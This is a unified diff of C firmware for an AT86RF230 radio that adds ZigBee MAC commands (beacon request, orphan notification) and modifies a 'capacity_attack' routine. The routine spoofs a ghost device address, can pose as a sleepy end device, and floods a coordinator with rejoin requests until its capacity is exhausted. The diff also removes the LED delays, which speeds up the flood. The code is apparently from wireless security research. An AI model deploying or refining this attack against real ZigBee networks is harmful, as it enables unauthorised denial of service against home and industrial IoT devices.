@@ -99,8 +99,14 @@ void send_zbee_cmd(uint8_t command, uint8_t security,
 	spi_send(AT86RF230_BUF_WRITE);
 	// Finally we applied hard-coded methods.
 	switch (command) {
+		case ZBEE_MAC_CMD_BEACON_RQ:
+			send_beacon_request(security, dst_addr, src_addr);
+			break;
 		case ZBEE_MAC_CMD_DATA_RQ :
 			send_data_request(security, dst_addr, src_addr);
+			break;
+		case ZBEE_MAC_CMD_ORPHAN_NOTIF :
+			send_orphan_notification(security, dst_addr, src_addr);
 			break;
 		case ZBEE_NWK_CMD_REJOIN_RQ :
 			send_rejoin_request(security, dst_addr, src_addr);
@@ -144,7 +150,26 @@ static uint8_t spi_send_blocks(void *data, uint8_t size)
 /********  END of Transciver Library *******/
 
 /********  Command Library *******/
-// NWK Layer Command
+// MAC Layer Command
+void send_beacon_request(uint8_t security, ieee802154_addr* dst_addr, ieee802154_addr* src_addr)
+{
+	count = 0;
+	length = 8 + 2;
+	FCF = 0x0803;		
+	seqno = 0xff;
+	// For beacon request, the dst addr and dst pan id is 0xffff
+	uint16_t const_dst_addr = 0xffff;
+	cmd = 0x07;
+
+	count += spi_send_blocks(&length, sizeof(length));
+	count += spi_send_blocks(&FCF, sizeof(FCF));
+	count += spi_send_blocks(&seqno, sizeof(seqno));
+	count += spi_send_blocks(&const_dst_addr, sizeof(const_dst_addr));
+	count += spi_send_blocks(&const_dst_addr, sizeof(const_dst_addr));
+	count += spi_send_blocks(&cmd, sizeof(cmd));
+
+	assert(count == length - 1);
+}
 void send_data_request(uint8_t security, ieee802154_addr* dst_addr, ieee802154_addr* src_addr)
 {
 	count = 0;
@@ -159,6 +184,25 @@ void send_data_request(uint8_t security, ieee802154_addr* dst_addr, ieee802154_a
 	count += spi_send_blocks(&dst_addr->pan, sizeof(dst_addr->pan));
 	count += spi_send_blocks(&dst_addr->short_addr, sizeof(dst_addr->short_addr));
 	count += spi_send_blocks(&src_addr->short_addr, sizeof(src_addr->short_addr));
+	count += spi_send_blocks(&cmd, sizeof(cmd));
+
+	assert(count == length - 1);
+}
+void send_orphan_notification(uint8_t security, ieee802154_addr* dst_addr, ieee802154_addr* src_addr)
+{
+	count = 0;
+	length = 16 + 2;
+	FCF = 0xc843;
+	seqno = 0xff;
+	cmd = 0x06;
+	uint16_t broad_addr = 0xffff;
+
+	count += spi_send_blocks(&length, sizeof(length));
+	count += spi_send_blocks(&FCF, sizeof(FCF));
+	count += spi_send_blocks(&seqno, sizeof(seqno));
+	count += spi_send_blocks(&broad_addr, sizeof(broad_addr));
+	count += spi_send_blocks(&broad_addr, sizeof(broad_addr));
+	count += spi_send_blocks(&src_addr->long_addr, sizeof(src_addr->long_addr));
 	count += spi_send_blocks(&cmd, sizeof(cmd));
 
 	assert(count == length - 1);
@@ -236,14 +280,19 @@ uint8_t capacity_attack(ieee802154_addr* dst_addr, uint64_t random_addr, uint8_t
 {
 	int32_t trial_count = 0;
 	ieee802154_addr ghost_addr = *dst_addr;
-	ghost_addr.short_addr  = 0x1234;
+	ghost_addr.short_addr  = 0x3234;
 	ghost_addr.long_addr = random_addr;
 	ghost_addr.device_type = type;
 	ghost_addr.rx_when_idle = 1;
+
 	if (type == 2)
 	{
 		// Pretend to be Sleepy End Device
 		ghost_addr.rx_when_idle = 0;
+	}
+	else
+	{
+		ghost_addr.rx_when_idle = 1;
 	}
 	rx_aack_config aack_config = {};
 	aack_config.aack_flag = 1;
@@ -254,8 +303,6 @@ uint8_t capacity_attack(ieee802154_addr* dst_addr, uint64_t random_addr, uint8_t
 	// The rejoin_full_flag is modified in processing_incoming_packets()
 	while(!rejoin_full_flag)
 	{
-		led(1);
-		DELAY_1;
 		send_zbee_cmd(ZBEE_NWK_CMD_REJOIN_RQ, 0, dst_addr, &ghost_addr, &aack_config);
 		if (type == 2)
 		{
@@ -274,10 +321,7 @@ uint8_t capacity_attack(ieee802154_addr* dst_addr, uint64_t random_addr, uint8_t
 		if (trial_count >= MAX_REJOIN_REQUEST_NUM) {
 			return 0;
 		}
-		led(0);
-		DELAY_1;
 	}
 	return 1;
 }
-
 /********  END of Attack-Specific Library *******/
